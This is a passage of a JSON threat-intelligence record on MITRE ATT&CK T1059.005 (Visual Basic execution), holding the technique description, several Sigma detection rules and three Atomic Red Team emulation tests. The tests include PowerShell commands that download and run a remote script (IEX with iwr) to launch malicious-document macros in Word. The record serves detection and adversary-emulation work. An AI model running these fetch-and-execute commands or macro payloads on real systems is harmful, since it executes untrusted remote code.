                            "raw": "{'x_mitre_platforms': ['Windows', 'macOS', 'Linux'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67', 'type': 'attack-pattern', 'created': '2020-03-09T14:29:51.508Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1059.005', 'url': 'https://attack.mitre.org/techniques/T1059/005'}, {'source_name': 'VB .NET Mar 2020', 'url': 'https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/', 'description': '.NET Team. (2020, March 11). Visual Basic support planned for .NET 5.0. Retrieved June 23, 2020.'}, {'source_name': 'VB Microsoft', 'url': 'https://docs.microsoft.com/dotnet/visual-basic/', 'description': 'Microsoft. (n.d.). Visual Basic documentation. Retrieved June 23, 2020.'}, {'source_name': 'Microsoft VBA', 'url': 'https://docs.microsoft.com/office/vba/api/overview/', 'description': 'Microsoft. (2019, June 11). Office VBA Reference. Retrieved June 23, 2020.'}, {'source_name': 'Wikipedia VBA', 'url': 'https://en.wikipedia.org/wiki/Visual_Basic_for_Applications', 'description': 'Wikipedia. (n.d.). Visual Basic for Applications. Retrieved August 13, 2020.'}, {'source_name': 'Microsoft VBScript', 'url': 'https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)', 'description': 'Microsoft. (2011, April 19). What Is VBScript?. Retrieved March 28, 2020.'}, {'source_name': 'Default VBS macros Blocking ', 'url': 'https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805', 'description': 'Kellie Eickmeyer. (2022, February 7). Helping users stay safe: Blocking internet macros by default in Office. Retrieved February 7, 2022.'}], 'modified': '2022-03-07T19:43:49.315Z', 'name': 'Visual Basic', 'description': 'Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\\n\\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\\n\\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}], 'x_mitre_detection': 'Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\\n\\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.3', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Process: Process Creation', 'Module: Module Load', 'Script: Script Execution', 'Command: Command Execution'], 'x_mitre_permissions_required': ['User', 'Administrator', 'SYSTEM']}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5cddf373-ef00-4112-ad72-960ac29bac34",
                        "lookup_data": {
                            "description": "Detects command line parameters used by Koadic hack tool",
                            "raw": "author: wagga, Jonhnathan Ribeiro, oscd.community\ndate: 2020/01/12\ndescription: Detects command line parameters used by Koadic hack tool\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - /q\n    - /c\n    - chcp\n    Image|endswith: \\cmd.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 5cddf373-ef00-4112-ad72-960ac29bac34\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/01/07\nreferences:\n- https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/\n- https://github.com/offsecginger/koadic/blob/457f9a3ff394c989cdb4c599ab90eb34fb2c762c/data/stager/js/stdlib.js\n- https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.003\n- attack.t1059.005\n- attack.t1059.007\ntitle: Koadic Execution\n",
                            "sigma:id": "5cddf373-ef00-4112-ad72-960ac29bac34",
                            "title": "Koadic Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
                        "lookup_data": {
                            "description": "Detects a suspicious parent of csc.exe, which could by a sign of payload delivery",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/02/11\ndescription: Detects a suspicious parent of csc.exe, which could by a sign of payload\n  delivery\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\csc.exe\n    ParentImage|endswith:\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\mshta.exe\nfalsepositives:\n- Unknown\nid: b730a276-6b63-41b8-bcf8-55930c8fc6ee\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/01/07\nreferences:\n- https://twitter.com/SBousseaden/status/1094924091256176641\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\n- attack.defense_evasion\n- attack.t1218.005\n- attack.t1027.004\ntitle: Suspicious Parent of Csc.exe\n",
                            "sigma:id": "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
                            "title": "Suspicious Parent of Csc.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "575dce0c-8139-4e30-9295-1ee75969f7fe",
                        "lookup_data": {
                            "description": "Adversaries can abuse of C:\\Windows\\System32\\gatherNetworkInfo.vbs script along with cscript.exe to gather information about the target",
                            "raw": "author: blueteamer8699\ndate: 2022/01/03\ndescription: Adversaries can abuse of C:\\Windows\\System32\\gatherNetworkInfo.vbs script\n  along with cscript.exe to gather information about the target\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - cscript.exe\n    - gatherNetworkInfo.vbs\nfalsepositives:\n- Administrative activity\nfields:\n- CommandLine\n- ParentImage\nid: 575dce0c-8139-4e30-9295-1ee75969f7fe\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs\nstatus: test\ntags:\n- attack.discovery\n- attack.execution\n- attack.t1615\n- attack.t1059.005\ntitle: GatherNetworkInfo.vbs Script Usage\n",
                            "sigma:id": "575dce0c-8139-4e30-9295-1ee75969f7fe",
                            "title": "GatherNetworkInfo.vbs Script Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1fac1481-2dbc-48b2-9096-753c49b4ec71",
                        "lookup_data": {
                            "description": "Detects javaw.exe in AppData folder as used by Adwind / JRAT",
                            "raw": "author: Florian Roth (Nextron Systems), Tom Ueltschi, Jonhnathan Ribeiro, oscd.community\ndate: 2017/11/10\ndescription: Detects javaw.exe in AppData folder as used by Adwind / JRAT\ndetection:\n  condition: selection\n  selection:\n  - CommandLine|contains|all:\n    - \\AppData\\Roaming\\Oracle\n    - \\java\n    - '.exe '\n  - CommandLine|contains|all:\n    - cscript.exe\n    - Retrive\n    - '.vbs '\nid: 1fac1481-2dbc-48b2-9096-753c49b4ec71\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.hybrid-analysis.com/sample/ba86fa0d4b6af2db0656a88b1dd29f36fe362473ae8ad04255c4e52f214a541c?environmentId=100\n- https://www.first.org/resources/papers/conf2017/Advanced-Incident-Detection-and-Threat-Hunting-using-Sysmon-and-Splunk.pdf\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\ntitle: Adwind RAT / JRAT\n",
                            "sigma:id": "1fac1481-2dbc-48b2-9096-753c49b4ec71",
                            "title": "Adwind RAT / JRAT",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                        "lookup_data": {
                            "description": "Unwrapping Ursnifs Gifts - The DFIR Report",
                            "link": "http://www.botvrij.eu/data/feed-osint/4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1674763285",
                            "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "25676e10-2121-446e-80a4-71ff8506af47",
                        "lookup_data": {
                            "description": "Detects adding and using Exchange PowerShell snap-ins to export mailbox data. As seen used by HAFNIUM and APT27",
                            "raw": "author: FPT.EagleEye, Nasreddine Bencherchali\ndate: 2021/03/03\ndescription: Detects adding and using Exchange PowerShell snap-ins to export mailbox\n  data. As seen used by HAFNIUM and APT27\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains: Add-PSSnapin\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n  selection_module:\n    CommandLine|contains:\n    - Microsoft.Exchange.Powershell.Snapin\n    - Microsoft.Exchange.Management.PowerShell.SnapIn\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 25676e10-2121-446e-80a4-71ff8506af47\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/09\nreferences:\n- https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/\n- https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\n- https://www.intrinsec.com/apt27-analysis/\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.collection\n- attack.t1114\ntitle: Exchange PowerShell Snap-Ins Usage\n",
                            "sigma:id": "25676e10-2121-446e-80a4-71ff8506af47",
                            "title": "Exchange PowerShell Snap-Ins Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cea72823-df4d-4567-950c-0b579eaf0846",
                        "lookup_data": {
                            "description": "Detects wscript/cscript executions of scripts located in user directories",
                            "raw": "author: Margaritis Dimitrios (idea), Florian Roth (Nextron Systems), oscd.community\ndate: 2019/01/16\ndescription: Detects wscript/cscript executions of scripts located in user directories\ndetection:\n  condition: selection1 and selection2 and not falsepositive\n  falsepositive:\n    ParentImage|contains: \\winzip\n  selection1:\n    CommandLine|contains:\n    - C:\\Users\\\n    - C:\\ProgramData\\\n    Image|endswith:\n    - \\wscript.exe\n    - \\cscript.exe\n  selection2:\n    CommandLine|contains:\n    - .jse\n    - .vbe\n    - .js\n    - .vba\n    - .vbs\nfalsepositives:\n- Winzip\n- Other self-extractors\nfields:\n- CommandLine\n- ParentCommandLine\nid: cea72823-df4d-4567-950c-0b579eaf0846\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\ntitle: WScript or CScript Dropper\n",
                            "sigma:id": "cea72823-df4d-4567-950c-0b579eaf0846",
                            "title": "WScript or CScript Dropper",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0bcfabcb-7929-47f4-93d6-b33fb67d34d1",
                        "lookup_data": {
                            "description": "Detects javaw.exe in AppData folder as used by Adwind / JRAT",
                            "raw": "author: Florian Roth (Nextron Systems), Tom Ueltschi, Jonhnathan Ribeiro, oscd.community\ndate: 2017/11/10\ndescription: Detects javaw.exe in AppData folder as used by Adwind / JRAT\ndetection:\n  condition: selection\n  selection:\n  - TargetFilename|contains|all:\n    - \\AppData\\Roaming\\Oracle\\bin\\java\n    - .exe\n  - TargetFilename|contains|all:\n    - \\Retrive\n    - .vbs\nid: 0bcfabcb-7929-47f4-93d6-b33fb67d34d1\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://www.hybrid-analysis.com/sample/ba86fa0d4b6af2db0656a88b1dd29f36fe362473ae8ad04255c4e52f214a541c?environmentId=100\n- https://www.first.org/resources/papers/conf2017/Advanced-Incident-Detection-and-Threat-Hunting-using-Sysmon-and-Splunk.pdf\nrelated:\n- id: 1fac1481-2dbc-48b2-9096-753c49b4ec71\n  type: derived\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\ntitle: Adwind RAT / JRAT File Artifact\n",
                            "sigma:id": "0bcfabcb-7929-47f4-93d6-b33fb67d34d1",
                            "title": "Adwind RAT / JRAT File Artifact",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1059.005",
                "display_name": "Command and Scripting Interpreter: Visual Basic",
                "atomic_tests": [
                    {
                        "name": "Visual Basic script execution to gather local computer information",
                        "auto_generated_guid": "1620de42-160a-4fe5-bbaf-d3fef0181ce9",
                        "description": "Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "vbscript": {
                                "description": "Path to sample script",
                                "type": "string",
                                "default": "PathToAtomicsFolder\\T1059.005\\src\\sys_info.vbs"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Sample script must exist on disk at specified location (#{vbscript})",
                                "prereq_command": "if (Test-Path \"#{vbscript}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{vbscript}\") -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/sys_info.vbs\" -OutFile \"#{vbscript}\""
                            }
                        ],
                        "executor": {
                            "command": "cscript \"#{vbscript}\" > $env:TEMP\\T1059.005.out.txt\n",
                            "cleanup_command": "Remove-Item $env:TEMP\\T1059.005.out.txt -ErrorAction Ignore",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Encoded VBS code execution",
                        "auto_generated_guid": "e8209d5f-e42d-45e6-9c2f-633ac4f1eefa",
                        "description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -> File -> Account -> About Word\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "The 64-bit version of Microsoft Office must be installed\n",
                                "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"\n",
                            "cleanup_command": "Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \"*mshta*\"}  | % { \"$(Stop-Process $_.ProcessID)\" } | Out-Null\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Extract Memory via VBA",
                        "auto_generated_guid": "8faff437-a114-4547-9a60-749652a03df6",
                        "description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\atomic_t1059_005_test_output.bin.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "ms_product": {
                                "description": "Maldoc application Word",
                                "type": "string",
                                "default": "Word"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Microsoft #{ms_product} must be installed\n",
                                "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n",
                            "cleanup_command": "Remove-Item \"$env:TEMP\\atomic_t1059_005_test_output.bin\" -ErrorAction Ignore\n",
                            "name": "powershell"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 12:07:05"
}